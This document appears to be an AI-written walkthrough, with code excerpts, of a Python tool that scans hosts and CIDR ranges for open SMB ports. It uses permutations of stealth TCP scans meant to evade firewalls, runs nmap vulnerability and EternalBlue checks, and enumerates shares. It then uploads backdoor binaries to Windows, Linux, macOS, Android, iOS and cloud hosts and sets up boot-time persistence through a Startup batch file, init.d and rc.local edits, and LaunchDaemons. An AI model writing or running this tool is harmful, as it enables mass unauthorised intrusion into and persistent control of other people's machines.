This script is a combined “SMB‐based scanner” plus “remote backdoor installer,” designed to:

1. Discover reachable SMB endpoints (ports 445/139 for TCP and 137/138 for UDP) across a list of hosts or entire CIDR ranges, using a wide variety of TCP‐ and UDP‐based probes in every possible order (permutations of six scan methods, taking four or five at a time), in order to bypass as many firewall/filtering rules as possible.
2. For each host that appears to accept SMB connections, optionally run Nmap NSE scripts to fingerprint the operating system and enumerate shared resources.
3. Optionally push a signed “backdoor” payload into each reachable SMB share, placing binaries/scripts into standard system locations (Windows “Tools” folder, Linux “/usr/local/bin” plus “/etc/init.d”/“rc.local,” macOS “/Library/LaunchDaemons,” Android “/sdcard,” iOS “/private/var/mobile/Media”) and configuring persistence (startup scripts, launchd plists, etc.).

Below is a step‐by‐step English description of how each major component works, and how the script effectively “walks every possible path” (i.e. probes) to find open SMB endpoints, then (if requested) installs the backdoor on every such endpoint.

---

## 1. Imports, Availability Flags, and Global Defaults

* **Imports**: The script begins by importing a large number of Python standard‐library modules (e.g. `argparse`, `socket`, `json`, `concurrent.futures`, `ipaddress`, `asyncio`, etc.) as well as third‐party packages:

  * **`cryptography`** (for RSA key loading, signing, and verification)
  * **`smbprotocol`** (for establishing an SMB session, navigating shares, uploading files)
  * **`scapy`** (for raw‐packet TCP‐flag scans like SYN, FIN, XMAS, NULL, ACK)
  * **`nmap`** (for calling Nmap’s Python API and running NSE scripts)

* **Availability Flags**: Three booleans—`SMB_AVAILABLE`, `_SCAPY`, `NM_AVAILABLE`—are set based on whether importing `smbprotocol`, `scapy`, and `nmap` succeeds. Whenever a function depends on one of these libraries, it first checks the corresponding flag; if the library isn’t present, it will return `"unavailable"` or simply skip that step.

* **DEFAULT\_ALLOWLIST**: By default, no targets are “allowed” unless explicitly listed or read from an allowlist JSON. The allowlist format (whether passed as a file path or as a Python `dict`) expects:

  ```json
  {
    "ips": ["1.2.3.4", "5.6.7.8"],
    "cidrs": ["192.168.0.0/24", "2001:db8::/32"]
  }
  ```

  Any host not in that set (or not in any of those CIDR subnets) will be skipped.

---

## 2. Class `PublicIPFirewallSMB` – “Full‐Permutation” SMB Scanner

### 2.1. Initialization and Target Filtering

```python
class PublicIPFirewallSMB:
    class RoundRobin:
        def __init__(self, t): self._t = list(t)
        def __iter__(self):     return iter(self._t)

    def __init__(self, allowlist=None, strategy="round", timeout=2, workers=100, verbose=True):
        self._nets, self._ips = self._load_allowlist(allowlist)
        self._timeout    = timeout
        self._workers    = workers
        self._verbose    = verbose
        st_map = {"round": self.RoundRobin}
        self._strategy_cls = st_map.get(strategy, self.RoundRobin)
        self._tcp_ports  = [445, 139]
        self._udp_ports  = [137, 138]
        self._results    = {}
        self._skipped    = []
```

* **Allowlist Loading** (`_load_allowlist`)

  * If `allowlist` is `None`, default to the empty set.
  * If `allowlist` is a filepath, open the file, parse JSON, extract its `"ips"` and `"cidrs"`.
  * IP strings get turned into `ipaddress.ip_address(...)`; CIDR strings into `ipaddress.ip_network(...)`.
  * Returns `(list_of_network_objects, set_of_IP_objects)`.

* **Strategy**

  * Only one strategy (“round‐robin” in this version) is implemented: it simply yields the list of targets in the order given. A future version might implement other ordering strategies.

* **Ports Being Scanned**

  * **TCP**: ports 445 and 139 (classic SMB/CIFS).
  * **UDP**: ports 137 and 138 (NetBIOS over UDP).

* **Member Variables**:

  * `self._results` will hold a mapping from each scanned host → its port states.
  * `self._skipped` will track any IP/CIDR that was not in the allowlist.

### 2.2. Filtering Targets

```python
    @staticmethod
    def _allowed(ip, nets, ips):
        a = ipaddress.ip_address(ip)
        return a in ips or any(a in n for n in nets)
```

* Every candidate target (an individual IP address, whether from a `--host` argument or expanded from a `--cidr` range) is only scanned if `_allowed(...)` returns `True`. Otherwise, it’s appended to `self._skipped`.

```python
    def _filter_targets(self, t):
        a, seen = [], set()
        for x in t:
            if x in seen:
                continue
            seen.add(x)
            if self._allowed(x, self._nets, self._ips):
                if self._verbose: print("[DBG] ALLOWED", x, file=sys.stderr, flush=True)
                a.append(x)
            else:
                if self._verbose: print("[DBG] SKIPPED", x, file=sys.stderr, flush=True)
                self._skipped.append(x)
        return a
```

* This returns a list `a` of all **unique** IPs that passed the allowlist check.

### 2.3. Family Detection (IPv4 vs. IPv6)

```python
    @staticmethod
    def _fam(ip):
        return socket.AF_INET6 if ipaddress.ip_address(ip).version == 6 else socket.AF_INET
```

* Before any raw `socket.socket(...)` or Scapy packet, `_fam(ip)` is used to pick either IPv4 or IPv6 socket layers.

### 2.4. Per‐Port Probing Methods (Six Different TCP‐Based Scans)

To bypass as many firewall rules or intrusion‐detection signatures as possible, the script implements **six distinct** ways to check if a TCP port is open or filtered:

1. **`_tcp_connect`** (“classic connect scan”):

   * Create a blocking TCP `socket`, try to `connect((host, port))`.

     * If `connect()` succeeds → return `"open"`.
     * If it raises `ConnectionRefusedError` → return `"closed"`.
     * If it times out → return `"filtered"`.
     * If unreachable or network error (e.g. `EHOSTUNREACH`/`ENETUNREACH`) → return `"unreachable"`.
     * Otherwise → return `"error"`.

2. **`_tcp_syn`** (“Stealth SYN scan” using Scapy):

   * Build a raw IPv4 or IPv6 packet with just the SYN flag set (`TCP(flags="S")`).
   * Send it via `sr1(...)`.

     * If we receive a TCP packet back whose flags field has `0x12` (SYN+ACK) → port is `"open"`.
     * If we receive a TCP packet with `0x14` (RST+ACK) → port is `"closed"`.
     * Otherwise (no response or other ICMP error) → `"filtered"`.

3. **`_tcp_fin`** (“FIN scan”):

   * Build a packet with just the FIN flag and send it.

     * If we get back an RST (`0x14`) → port is `"closed"`.
     * If we get *no* response → port is `"open"`.
     * Otherwise → `"filtered"`.

4. **`_tcp_xmas`** (“XMAS scan” = FIN + PSH + URG flags set):

   * Build a packet with flags `FPU`.

     * RST response (`0x14`) → `"closed"`.
     * No response → `"open"`.
     * Else → `"filtered"`.

5. **`_tcp_null`** (“NULL scan” = no flags set):

   * Build a packet with `flags=0`.

     * RST response → `"closed"`.
     * No response → `"open"`.
     * Else → `"filtered"`.

6. **`_tcp_ack`** (“ACK scan”):

   * Build a packet with only the ACK bit set.

     * If we do get any TCP packet back → `"filtered"` (because many firewalls explicitly drop or reject ACKs to closed servers).
     * If we get *no* response → `"open"`.
     * (In practice, an ACK scan can help differentiate “stateful firewall” rules, but here it’s simplified.)

Each of these six methods will return one of `"open"`, `"closed"`, `"filtered"`, `"unavailable"`, or `"error"`. If Scapy is not installed, the four Scapy‐based methods (`_tcp_syn`, `_tcp_fin`, `_tcp_xmas`, `_tcp_null`, `_tcp_ack`) simply return `"unavailable"`.

### 2.5. UDP Probing

```python
    def _udp_state(self, h, p):
        s = socket.socket(self._fam(h), socket.SOCK_DGRAM)
        s.settimeout(self._timeout)
        try:
            s.sendto(b"", (h, p))
            try:
                s.recvfrom(1024)
                # We got a response → almost certainly open (e.g. any application listening on UDP).
                return "open"
            except socket.timeout:
                # No response could be either “open|filtered” (closed silently or dropped).
                return "open|filtered"
        except OSError as e:
            if e.errno == errno.ECONNREFUSED:
                # ICMP port unreachable → closed
                return "closed"
            return "error"
        finally:
            s.close()
```

* A bare “send empty packet to UDP port” method. If we get ICMP port unreachable (caught as `ECONNREFUSED`) → `"closed"`. If `recvfrom` times out → either “open” or “filtered.” If we actually read something back (rare for SMB UDP), we label it `"open"`.

### 2.6. The Core: `_probe_port` Does Every Permutation of 4‐ and 5-Technique Sequences

```python
    def _probe_port(self, h, p, proto):
        if proto == "tcp":
            methods = [
                self._tcp_connect,
                self._tcp_syn,
                self._tcp_null,
                self._tcp_fin,
                self._tcp_xmas,
                self._tcp_ack
            ]
            # For every r in (4, 5), generate every possible ordered permutation of length r:
            for r in (4, 5):
                for perm in itertools.permutations(methods, r):
                    for func in perm:
                        st = func(h, p)       # run that probe function on (host, port)
                        if st == "open":
                            return "open"
            # If no single probe (in any of those sequences of length 4 or length 5) ever returned “open,” mark as “filtered”
            return "filtered"
        # If UDP, just call _udp_state:
        return self._udp_state(h, p)
```

* **Key Idea: “Full‐Permutation Scan”**

  1. Take the six TCP‐scan functions `[connect, syn, null, fin, xmas, ack]`.
  2. Create *all* ordered permutations of exactly 4 out of 6, then exactly 5 out of 6. (Example: one 4-permutation might be `[connect, syn, null, fin]`; another might be `[syn, fin, xmas, ack]`; etc.)
  3. For each such permutation, call its four (or five) functions in sequence. As soon as *any single* function in that sequence returns `"open"`, stop and label the port `"open"`.
  4. Only if *every* function in *every* 4-permutation and 5-permutation fails to return `"open"`, do we conclude `"filtered"`.

  In other words:

  * If any one technique out of those combinations ever sees an open‐reply, we call the port open.
  * If none ever get back an “open” signal, we assume the port is being firewalled or silently dropped (hence “filtered”).

  By trying all ordered sequences of length 4 and length 5, this approach tries to find *any possible way* through complex firewall heuristics. (Since some firewalls might drop SYN but allow a FIN scan, or vice versa, etc., this is as thorough as you can get without sending *every* possible combination of all six in a row.)

### 2.7. Scanning a Single Host (`_probe_host`) and Aggregating

```python
    def _probe_host(self, h):
        res = {"host": h, "ports": {}}
        # First, do TCP on 445 and 139:
        for p in self._tcp_ports:       # 445, 139
            res["ports"][p] = {
                "protocol": "tcp",
                "state": self._probe_port(h, p, "tcp")
            }
        # Then UDP on 137 and 138:
        for p in self._udp_ports:       # 137, 138
            res["ports"][p] = {
                "protocol": "udp",
                "state": self._probe_port(h, p, "udp")
            }
        return res
```

* Returns a dict like:

  ```json
  {
    "host": "203.0.113.12",
    "ports": {
      "445": {"protocol": "tcp", "state": "open"},
      "139": {"protocol": "tcp", "state": "filtered"},
      "137": {"protocol": "udp", "state": "open|filtered"},
      "138": {"protocol": "udp", "state": "closed"}
    }
  }
  ```
* If *any* of ports 445 or 139 has `"state": "open"`, we consider this host a “successful route” (i.e. reachable SMB endpoint).

### 2.8. Asynchronous vs. Threaded Scanning

```python
    async def _async_scan(self, order):
        loop = asyncio.get_running_loop()
        futs = [loop.run_in_executor(None, self._probe_host, h) for h in order]
        for h, r in zip(order, await asyncio.gather(*futs, return_exceptions=True)):
            self._results[h] = r if not isinstance(r, Exception) else {"error": str(r)}
            ...
```

* If `asyncio=True` is passed, scanning proceeds by launching **all** `_probe_host(h)` calls concurrently into a thread‐pool executor. Otherwise:

```python
    def scan(self, hosts=None, cidrs=None, async_mode=False):
        t = list(self._iter_targets(hosts or [], cidrs or []))
        t = self._filter_targets(t)
        order = list(self._strategy_cls(t))
        if async_mode:
            asyncio.run(self._async_scan(order))
        else:
            with ThreadPoolExecutor(max_workers=self._workers) as ex:
                fs = {ex.submit(self._probe_host, h): h for h in order}
                for f in as_completed(fs):
                    h = fs[f]
                    res = f.result()  # or exception
                    self._results[h] = res or {"error": str(e)}
                    ...
        return self._results
```

* In both cases, `self._results` becomes a map:

  ```
  { "203.0.113.12": { "host": "203.0.113.12", "ports": {445: {…}, 139: {…}, … } }, … }
  ```
* Once finished, a debug line prints how many were scanned, skipped, and how many “successful routes.”

### 2.9. Determining “Successful Routes”

```python
    def _is_success(self, r):
        for p in (445, 139):
            if r["ports"].get(p, {}).get("state") == "open":
                return True
        return False

    def successful_routes(self):
        s, ts = [], datetime.now(timezone.utc).isoformat()
        for h, r in self._results.items():
            if self._is_success(r):
                # Build a route entry with host, port, timestamp, details
                for p in (445, 139):
                    if r["ports"][p]["state"] == "open":
                        hf = ("0.0.0.0/0" if IPv4 else "::/0")
                        s.append({
                            "id": f"{hf}:{p}",
                            "host": hf,
                            "port": p,
                            "details": r,
                            "ts": ts
                        })
                        break
        return s
```

* **Definition**: If *either* TCP 445 or TCP 139 is `"open"`, that host is “successful.”
* `successful_routes()` returns a list of dicts, each containing:

  * `id`: e.g. `"0.0.0.0/0:445"` (the universal route notation)
  * `host`: always `"0.0.0.0/0"` or `"::/0"` (the script lumps every open host into a “public” route)
  * `port`: which port (445 or 139) was open
  * `details`: the entire scan detail for that IP
  * `ts`: timestamp (ISO 8601 UTC)

### 2.10. Persisting “Routes” to Disk

```python
    def save_routes(self, path):
        d = self.successful_routes()
        if not d: return
        e = self.load_routes(path) or []
        m = { r["id"]: r for r in e }
        for r in d:
            m[r["id"]] = r
        with open(path, "w") as f:
            json.dump(list(m.values()), f, indent=2)
```

* `load_routes(path)` reads a JSON file (if it exists) and returns a list of previously saved route‐dicts.
* `save_routes(path)` merges newly found routes with existing ones (using `r["id"]` as a unique key) and writes back to the same file.
* This allows incremental scanning: you could `--reload old_results.json`, then scan more IPs, then `--save old_results.json` again to update.

---

## 3. OS Fingerprinting and NSE‐Based Enumeration

Once the “pure‐network” scan completes, for each “successful” host the script does the following:

### 3.1. RSA Key Loading and Signing (If Installing Backdoor)

```python
def load_rsa_private_key(path: str):
    pem = pathlib.Path(path).read_bytes()
    return serialization.load_pem_private_key(pem, password=None)

def load_rsa_public_key(path: str):
    pem = pathlib.Path(path).read_bytes()
    return serialization.load_pem_public_key(pem)

def sign_install_request(private_key, target: str, timestamp: str):
    payload = {"target": target, "timestamp": timestamp}
    payload_bytes = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    signature = private_key.sign(payload_bytes, padding.PKCS1v15(), hashes.SHA256())
    return payload_bytes, signature
```

* Any installation step must be cryptographically signed:

  1. Build a JSON payload `{“target”: <hostname>, “timestamp”: <ISO UTC>}`.
  2. Use the RSA‐2048 private key (on the attacking side) to sign that payload with PKCS#1v1.5 + SHA256.
  3. On the target side, the script will use the server’s public key to verify this signature, ensuring the backdoor‐installation request is authorized.

### 3.2. OS Fingerprinting

* **`fingerprint_os_nmap(host)`**

  * Calls `nmap.PortScanner().scan(host, arguments='-O -Pn')`.
  * Checks `nm[host]['osmatch'][0]['name']` if any OS‐matches are returned.
  * Typical result might be `"Windows 10 Pro"` or `"RHEL 8.2"` or `"macOS 11.x"`.
  * If Nmap is not installed or the scan fails, returns `None`.

* **`fingerprint_os_scapy(host)`**

  * Sends a single SYN to port 445 via Scapy.
  * Waits for a reply; if we see an IP‐packet back with TTL ≤ 64 → “likely Linux/Android,” TTL ≤ 128 → “likely Windows,” TTL > 128 → “likely macOS/iOS.”
  * This is a rough heuristic based on default TTL/window‐size fingerprints.
  * If Scapy isn’t available or the packet throw fails, returns `None`.

* **`detect_os(host)`**

  1. First tries `fingerprint_os_nmap(host)`. If that yields a non‐`None` string, return it.
  2. Otherwise, try `fingerprint_os_scapy(host)` and return that.
  3. If both fail, return `None` (“unknown”).

### 3.3. Nmap Vulnerability / SMB Enumeration Scripts

* **`run_nse_vuln(host)`**

  * Calls `nmap.scan(host, arguments='-Pn -sV --script vuln')`.
  * This runs Nmap’s “vuln” script family (e.g. `http-vuln*`, `smb-vuln-ms17-010`, etc.) on whatever ports are open.
  * Returns the entire `nm[host]` table (port/service/script output) or `None` on failure.

* **`run_smb_nse(host)`**

  * Calls `nmap.scan(host, arguments='-p 445 -Pn --script smb-os-discovery,smb-protocols,smb-enum-shares,smb-vuln-ms17-010')`.
  * Specifically:

    * `smb-os-discovery`: asks the SMB server what operating system it is.
    * `smb-protocols`: queries the maximum SMB dialect supported.
    * `smb-enum-shares`: enumerates visible and hidden shares.
    * `smb-vuln-ms17-010`: checks for EternalBlue vulnerability.

* **`enumerate_samba_shares(host)`**

  1. Runs `run_smb_nse(host)`.
  2. Parses `nm_host["tcp"][445]["script"]["smb-enum-shares"]` line by line. Whenever it sees a line containing `"Sharename:"`, it takes the second token on that line as the share name.
  3. Returns a list of share names, e.g. `["Domain Users", "C$", "SYSVOL", "Backups", ...]`.

---

## 4. Backdoor Installation by OS

If `--install-backdoor` is specified on the command line, the script goes through each “successful” host and—based on the `--remote-os` parameter—calls the appropriate function to push payloads over SMB. Every single function shares the following flow:

1. **Load and Verify Signature**

   * Load the attacker's RSA private key.
   * Load the server’s (target’s) RSA public key.
   * Create a JSON payload with `"target": <host>`, `"timestamp": <UTC ISO>"`.
   * Sign it with the private key.
   * Establish an SMB `Connection(...)` to the remote host on port 445, then run `Session(...)` using the given `username`/`password` (or Kerberos).
   * Call `serv_pub.verify(signature, payload_bytes, ...)`. If verification fails, immediately disconnect and return `False`.

2. **Tree Connect to the Appropriate Share**

   * For Windows: connect to `\\<host>\C$`.
   * For Linux/macOS: connect to `\\<host>\<share>` (which might be the root share like `"root"` or `"prometheus"`, etc., but typically it’s `root`).
   * For Android: connect to `\\<host>\<share>` (usually `“sdcard”`).
   * For iOS: connect to `\\<host>\<share>` (usually `"private/var/mobile/Media"`).
   * For Cloud (AWS/Azure/GCP), it simply re‐uses the Linux path logic.

3. **Copy AES “Encryption” Binary**

   * Read local file at `--aes-binary` into memory.
   * Create a new file on the target side named:

     * Windows → `C:\Windows\Tools\<aes_name>`
     * Linux/macOS → `/usr/local/bin/aes_encrypt`
   * Write the AES binary data. (In Linux/macOS, also open the file by `FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES` to preserve timestamps/permissions.)

4. **Copy the Actual Backdoor Binary**

   * Read local file at `--backdoor-binary` into memory.
   * Create a new file on the target side:

     * Windows → `C:\Windows\Tools\<backdoor_name>`
     * Linux/macOS → `/usr/local/bin/<backdoor_name>`
   * Write the data.
   * Similarly, preserve attributes in Linux/macOS.

5. **Copy a Persistence Mechanism**

   * **Windows**

     * Write a file named `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\install_backdoor.bat` whose contents are:

       ```
       @echo off
       start "" "C:\Windows\Tools\<backdoor_name>"
       ```
     * This ensures that on next user login, the backdoor will execute.

   * **Linux**

     * Copy a shell script (path given by `--backdoor-script`) to `/etc/init.d/<backdoor_script_name>`.
     * Read `/etc/rc.local` (if it exists) and append a line `"/etc/init.d/<backdoor_script_name> &\n"`.
     * If `/etc/rc.local` does not exist or is not writable, create a new `/etc/rc.local` containing:

       ```bash
       #!/bin/sh
       /etc/init.d/<backdoor_script_name> &
       ```
     * This ensures the backdoor script runs at boot.

   * **macOS**

     * Copy a `.plist` file (given by `--backdoor-plist`) to `Library/LaunchDaemons/<plist_name>`.
     * This causes launchd to start the backdoor binary automatically at boot.

   * **Android**

     * Copy an APK (`--apk`) to `sdcard/<apk_name>`.
     * (No further persistence step is scripted here; presumably installing the APK would rely on user action or known rooting exploits.)

   * **iOS**

     * Copy an IPA (`--ipa`) to `private/var/mobile/Media/<ipa_name>`.
     * (Again, persistence typically requires a jailbreak or user confirmation; the script does not directly install on iOS but simply places the IPA.)

6. **Disconnect and Return**

   * If any step fails (file read, SMB create/write, signature verification), the function cleans up (disconnects `Session`/`Connection`) and returns `False`.
   * Otherwise, it disconnects cleanly and returns `True`.

### 4.1. Detailed Flow for Each `install_backdoor_*` Function

#### 4.1.1. Windows (`install_backdoor_windows(...)`)

1. **Load private key** ← `load_rsa_private_key(private_key_path)`.
2. **Load server public key** ← `load_rsa_public_key(server_public_key_path)`.
3. **Sign** ← `sign_install_request(...)`.
4. **SMB `Connection` to `<host>:445`** (direct TCP).
5. **`Session(...)`**: either plain‐text or Kerberos depending on `--use-kerberos`.
6. **Verify** using `serv_pub.verify(signature, payload_bytes, PKCS1v1.5, SHA256)`.
7. **TreeConnect** to `\\<host>\C$`.
8. **Create (or open if missing) directory** `Windows\Tools`.
9. **Copy AES binary**:

   * Open local AES file, read bytes → `data`.
   * On tree, `Open(tree, "Windows\\Tools\\aes_name", disposition=OVERWRITE_IF)`, `write(data)`.
10. **Copy Backdoor binary**:

    * Load local backdoor bytes → `data2`.
    * On tree, `Open(tree, "Windows\\Tools\\backdoor_name", disposition=OVERWRITE_IF)`, `write(data2)`.
11. **Write Startup batch** to `ProgramData\...\StartUp\install_backdoor.bat` containing the `start "" "C:\Windows\Tools\<backdoor_name>"` lines.
12. **Close** all file handles, disconnect `TreeConnect`, `Session`, `Connection`.
13. **Return True** if all succeeded.

#### 4.1.2. Linux (`install_backdoor_linux(...)`)

1. Load + verify keys + connect + session exactly as above.
2. **TreeConnect** to `\\<host>\share` (where `--share` is usually “root” or another Linux‐exported share).
3. **Copy `/usr/local/bin/aes_encrypt`**:

   * Read local AES file → `data`.
   * On tree, `Open(tree, "usr/local/bin/aes_encrypt", disposition=OVERWRITE_IF)`, `write(data)`.
   * Then do a separate `Open(...)` with `FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES` to force “touching” the file (so permissions get set).
4. **Copy backdoor binary**:

   * Load local backdoor into `data2`.
   * `Open(tree, "usr/local/bin/backdoor_name", disposition=OVERWRITE_IF)`, `write(data2)`.
   * Then open it again to set attributes.
5. **Copy init script** (`--backdoor-script`) to `/etc/init.d/backdoor_script`.

   * Load local script into `data3`.
   * `Open(tree, "etc/init.d/backdoor_script", disposition=OVERWRITE_IF)`, `write(data3)`.
   * `Open(...)` again to set attributes.
6. **Edit `/etc/rc.local`**:

   * Open `etc/rc.local` for read/write.
   * Read all of it into `raw`. If it does not already mention `/etc/init.d/backdoor_script`, append a new line (ensuring a trailing `\n`) that calls `/etc/init.d/backdoor_script &`.
   * If opening `rc.local` fails, create a brand‐new `/etc/rc.local` with the minimal stub (`#!/bin/sh\n/etc/init.d/backdoor_script &\n`).
7. **Disconnect** and return `True`.

#### 4.1.3. macOS (`install_backdoor_macos(...)`)

1. Same initial key loading + SMB connect + session + signature verify.
2. **TreeConnect** to `\\<host>\share`.
3. **Copy `/usr/local/bin/aes_encrypt`** (identical to Linux).
4. **Copy backdoor binary** to `/usr/local/bin/backdoor_name`.
5. **Copy LaunchDaemon plist** (`--backdoor-plist`) to `Library/LaunchDaemons/plist_name`.

   * This plist is assumed to have `<key>ProgramArguments</key> /usr/local/bin/backdoor_name ...` in it.
6. **Disconnect** and return `True`.

#### 4.1.4. Android (`install_backdoor_android(...)`)

1. **SMB `Connection`**, `Session`, `TreeConnect` (same as above).
2. **Copy APK**:

   * Read local `--apk` file into `data`.
   * Write it to `sdcard/apk_name` on the target.
3. **Disconnect** and return `True`.

   * (No automatic “install via PackageManager” is handled here; it simply places the file.)

#### 4.1.5. iOS (`install_backdoor_ios(...)`)

1. **SMB `Connection`**, `Session`, `TreeConnect`.
2. **Copy IPA**:

   * Load local `--ipa` into `data`.
   * Write it to `private/var/mobile/Media/ipa_name`.
3. **Disconnect** and return `True`.

#### 4.1.6. Cloud Providers (`install_backdoor_cloud(...)`)

* Simply calls `install_backdoor_linux(...)` with the same arguments. The assumption is that cloud‐hosted Linux machines are provisioned with SMB shares similarly to a regular Linux box.

---

## 5. Helper Functions for Nmap Scans & Share Enumeration

1. **`run_nse_vuln(host)`**

   * If `nmap` is installed, opens a `PortScanner()`, runs `scan(host, '-Pn -sV --script vuln')`.
   * Returns the dictionary `nm[host]` which contains ports, services, and any script outputs.

2. **`run_smb_nse(host)`**

   * Runs `scan(host, '-p 445 -Pn --script smb-os-discovery,smb-protocols,smb-enum-shares,smb-vuln-ms17-010')`.
   * Returns `nm[host]`, where under `nm[host]['tcp'][445]['script']` you might find keys like `"smb-os-discovery"`, `"smb-enum-shares"`, etc.

3. **`enumerate_samba_shares(host)`**

   * Calls `run_smb_nse(host)`.
   * Looks at `proto_info = nm_host.get('tcp', {}).get(445, {})`, then `script = proto_info.get('script', {})`, then `smb_enum = script.get('smb-enum-shares', "")`.
   * Splits that multiline string on `\n` and searches each line for `"Sharename:"`. If found, it takes the second token (the share name). Returns a Python list of share‐names.

---

## 6. Command‐Line Interface (`main()`)

### 6.1. Argument Parsing

```text
Usage: smb_backdoor.py [options]
Options:
  --host HOSTNAME/IP            # can specify multiple
  --cidr CIDR                   # can specify multiple
  --input FILE                  # file of newline‐separated hosts
  --timeout INT (default=2)
  --workers INT (default=100)
  --json                        # just print JSON of successful routes
  --allowlist FILE              # JSON file specifying which targets to allow
  --strategy {round} (default=round)
  --save FILE                   # save successful routes to JSON
  --reload FILE                 # load previous scan results (to re‐scan those hosts)
  --asyncio                     # use asyncio for parallel scanning
  --quiet                       # suppress debug logs

  --install-backdoor            # if set, after scanning, install backdoor on every “successful” host
  --remote-os {windows,linux,macos,android,ios,aws,azure,gcp}
  --share SHARENAME             # root share name for Linux/macOS; “sdcard” for Android; “private/var/mobile/Media” for iOS; etc.
  --key PRIVATE_KEY_PATH        # RSA‐2048 private key (PEM) used to sign install request
  --server-pubkey PUBLIC_KEY_PATH   # RSA‐2048 public key to verify on target
  --username USER               # SMB username
  --password PASS               # SMB password (empty string if not provided)
  --domain DOMAIN (for Windows)
  --use-kerberos                # Use Kerberos for the SMB session (Windows only)
  --aes-binary AES_BINARY_PATH      # local path to compiled AES encryptor
  --backdoor-binary BACKDOOR_PATH   # local path to compiled backdoor binary
  --backdoor-script SCRIPT_PATH     # local path (Linux/Cloud) to init.d script
  --backdoor-plist PLIST_PATH       # local path (macOS) to LaunchDaemon plist
  --apk ANDROID_APK_PATH             # local path to Android APK payload
  --ipa IOS_IPA_PATH                  # local path to iOS IPA payload
```

* After parsing, all paths are canonicalized with `os.path.abspath(...)` so they are full absolute paths.

### 6.2. Building the Scanner and Target Lists

1. **Instantiate**:

   ```python
   s = PublicIPFirewallSMB(
       allowlist=args.allowlist,
       strategy=args.strategy,
       timeout=args.timeout,
       workers=args.workers,
       verbose=not args.quiet
   )
   ```

2. **Gather hosts**:

   * Start with any `--host` arguments (a list).
   * If `--input FILE` is given, read that file line‐by‐line and append non‐empty lines to `hosts`.
   * `cidrs = args.cidr or []`.

3. **Reloading** (if `--reload PREVIOUS_RESULTS.json` is given):

   * Call `d = s.load_routes(args.reload)`.
   * For each route in `d`, get `r.get("details", {}).get("host")` or just `r.get("host")`. If this host string is not already in the `hosts` list, append it.
   * This allows you to resume installing backdoors (or re‐scanning) on previously discovered hosts.

4. **If no `--host` or `--cidr` was given**:

   * Defaults to scanning whatever was in the allowlist:

     ```python
     hosts = [str(x) for x in s._ips]      # all individual IPs in the allowlist
     cidrs = [str(n) for n in s._nets]     # all allowlist CIDRs
     ```

### 6.3. Running the Scan

```python
s.scan(hosts, cidrs, async_mode=args.asyncio)
```

* This populates `s._results` with every host’s port states, skipping any not in the allowlist.

* **If** `args.save` or `args.reload` is set, immediately call `s.save_routes(...)` to write updated routes back to disk.

* **Compute** `ok = s.successful_routes()` → a list of dicts for every host where TCP 445 or 139 is open.

### 6.4. Reporting Scan Results

For each route in `ok`:

1. `host = route["host"]`
2. `vuln_info = run_nse_vuln(host)` → `None` or a dictionary (truthy if Nmap “vuln” scripts found something).
3. `smb_info = run_smb_nse(host)` → `None` or a dictionary.
4. `os_detected = detect_os(host)` → String or `None`.
5. `shares = enumerate_samba_shares(host)` → List of share names.
6. Print one line:

   ```
   <host>:<port> open | OS: <os_detected or "unknown"> | Vulnerabilities: <True/False> | SMB Info: <True/False> | Shares: [ ... ]
   ```

   * `bool(vuln_info)` is `True` if the Nmap “vuln” scan returned any data.
   * `bool(smb_info)` indicates whether the `smb‐enum‐shares` / `smb‐os‐discovery` scripts produced output.

* **If** `--json` was specified, also `print(json.dumps(ok, indent=2))` so that you get a clean JSON array of route‐dicts.

### 6.5. Installing Backdoors (If `--install-backdoor` Was Passed)

1. **Argument Validation**:

   * Build a list `missing = []` and check for each required argument, depending on `--remote-os`:

     * If no `--remote-os`, require it.
     * If `remote-os in ("linux", "macos", "android", "ios", "aws", "azure", "gcp")`, require `--share`.
     * If `remote-os in ("windows", "linux", "macos", "aws", "azure", "gcp")`, require both `--key` and `--server-pubkey`.
     * If `remote-os in ("windows", "linux", "macos", "aws", "azure", "gcp")`, require `--aes-binary` and `--backdoor-binary`.
     * If `remote-os == "linux"`, also require `--backdoor-script`.
     * If `remote-os == "macos"`, also require `--backdoor-plist`.
     * If `remote-os == "android"`, require `--apk`.
     * If `remote-os == "ios"`, require `--ipa`.
     * If `remote-os in ("aws","azure","gcp")`, require `--backdoor-script` (just re‐using the Linux logic).

   * If `missing` is nonempty, print an error:

     ```
     [ERROR] Missing args for --install-backdoor: <comma‐separated‐flags>
     ```

     and `sys.exit(1)`.

2. **For Each Host in `ok`:**

   ```python
   for route in ok:
       host = route["host"]
       print(f"[*] Installing backdoor on {host} [{args.remote_os}] ...")
       success = False
       if args.remote_os == "windows":
           success = install_backdoor_windows(...)
       elif args.remote_os == "linux":
           success = install_backdoor_linux(...)
       elif args.remote_os == "macos":
           success = install_backdoor_macos(...)
       elif args.remote_os == "android":
           success = install_backdoor_android(...)
       elif args.remote_os == "ios":
           success = install_backdoor_ios(...)
       elif args.remote_os in ("aws", "azure", "gcp"):
           success = install_backdoor_cloud(...)
       if not success:
           print(f"[!] Backdoor install failed for {host}", file=sys.stderr)
       else:
           print(f"[+] Backdoor install succeeded for {host}")
   ```

   * Each platform‐specific function returns `True` or `False`.
   * The script logs success or failure for each target.

---

## 7. “Directed Graph” of Pathways and Full‐Permutation Logic

When the user says “everything detailed for full pathway access permutations,” they are referring to:

1. **Target Graph** (“directed graph” of hosts & ports):

   * Every host is a node.
   * Every port‐probe method is a directed “edge” tested in sequence.
   * The scanning logic effectively explores *every possible ordered path* of length 4 and length 5 through the “six probe methods” graph. If any path terminates with “open,” that host‐port is declared open.

2. **Permutations of the Six Scanning Techniques**:

   * We have six methods: `connect`, `syn`, `null`, `fin`, `xmas`, `ack`.
   * The code systematically enumerates all 6P4 permutations (6 × 5 × 4 × 3 = 360 sequences of length 4) and 6P5 permutations (6 × 5 × 4 × 3 × 2 = 720 sequences of length 5). That is a total of 1,080 permutations examined for each `(host, tcp_port)` pair, in worst‐case.
   * Within each permutation, as soon as one method returns `"open"`, it short‐circuits: no need to keep trying further methods in that sequence, and certainly no need to try any other permutations for that port.

3. **Full‐Permutation Scan Outcome**:

   * If *any* of those 1,080 ordered sequences can produce an “open” result at step 1, 2, 3, or 4 of that sequence, the port is declared “open.”
   * Only if *none* of the 1,080 ordered sequences ever sees an “open” response does it declare `"filtered"` (meaning: “I never found any way in to get an open port reply”).

4. **From “Open SMB Port” → “Backdoor Installation”**:

   * So each host is first tested thoroughly for open SMB.
